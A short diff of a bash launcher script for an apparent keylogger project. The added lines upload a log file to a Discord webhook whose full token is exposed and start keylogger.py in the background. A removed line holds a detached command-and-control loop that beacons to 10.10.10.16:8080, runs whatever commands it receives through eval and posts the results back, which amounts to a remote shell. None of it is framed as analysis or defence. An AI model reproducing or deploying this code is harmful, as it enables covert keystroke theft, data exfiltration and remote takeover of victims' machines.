@@ -1,5 +1,4 @@
 #!/bin/bash 
-curl -F "filename=@/home/dada/log.txt" "https://discord.com/api/webhooks/1182114686423007296/hwoTmjvNXp_dw58nOQDH8r_2ZTDUD2ZegapdTB95wBXQZNG8XvfTYihmVsROI8oVLLj6"
-python3 /home/dada/Keylogger/linux/keylogger.py &
+curl -F "filename=@/home/$USER/log.txt" "https://discord.com/api/webhooks/1182114686423007296/hwoTmjvNXp_dw58nOQDH8r_2ZTDUD2ZegapdTB95wBXQZNG8XvfTYihmVsROI8oVLLj6"
+python3 /home/$USER/Keylogger/linux/keylogger.py &
 clear
-nohup bash -c 's=10.10.10.16:8080&&i=3cd8db-6f122b-7e1422&&hname=$(hostname)&&p=http://;curl -s "$p$s/3cd8db/$hname/$USER" -H "Authorization: $i" -o /dev/null&&while :; do c=$(curl -s "$p$s/6f122b" -H "Authorization: $i")&&if [ "$c" != None ]; then r=$(eval "$c" 2>&1)&&echo $r;if [ $r == byee ]; then pkill -P $$; else curl -s $p$s/7e1422 -X POST -H "Authorization: $i" -d "$r";echo $$;fi; fi; sleep 0.8; done;' & disown
